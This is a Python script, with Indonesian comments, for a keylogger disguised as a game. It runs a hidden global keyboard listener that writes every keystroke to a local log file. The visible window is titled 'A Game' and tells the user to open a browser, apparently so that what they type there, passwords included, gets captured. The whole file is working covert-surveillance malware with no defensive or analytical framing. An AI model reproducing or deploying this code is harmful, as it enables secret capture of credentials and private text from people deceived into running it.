import string as str
import tkinter as tk
from pynput import keyboard

LETTERS = set(str.ascii_letters)

IGNORE_KEYS = {
    "shift",
    "shift_r",
    "ctrl",
    "ctrl_l",
    "ctrl_r",
    "alt",
    "alt_l",
    "alt_r",
    "cmd",
    "cmd_r",
}


def on_press(key):
  try:
    try:
      key_str = key.char
    except AttributeError:
      key_str = key.name

    if key_str is None:
      return

    if key_str.lower() in IGNORE_KEYS:
      return

    # Format teks
    if key_str in ("enter", "return"):
      formatted_key = "[RETURN]"
    elif key_str == "space":
      formatted_key = "[SPACE]"
    elif key_str == "backspace":
      formatted_key = "[BACKSPACE]"
    elif key_str not in LETTERS and len(key_str) > 1:
      formatted_key = f"[{key_str.upper()}]"
    else:
      formatted_key = key_str

    # Tulis ke file dengan tambahan flushing & penanganan error
    with open("keylog2.txt", "a", encoding="utf-8") as file:
      if key_str in ("enter", "return"):
        file.write(formatted_key + "\n")
      else:
        file.write(formatted_key + " ")

      # Paksa OS buat langsung nulis isi buffer ke disk detik itu juga
      file.flush()

    print(f"Key pressed di background: {key_str}")

  except Exception as e:
    # Tangkap error kalau ada masalah pas nulis file biar kelihatan di terminal
    print(f"Error pada listener: {e}")

listener = keyboard.Listener(on_press=on_press)
listener.start()

window = tk.Tk()
window.title("Sebuah Game")
window.geometry("500x300")

label = tk.Label(
    window,
    text="Buka browser.",
    font=("Poppins", 12),
)
label.pack(pady=90)

try:
  window.mainloop()
finally:
  listener.stop()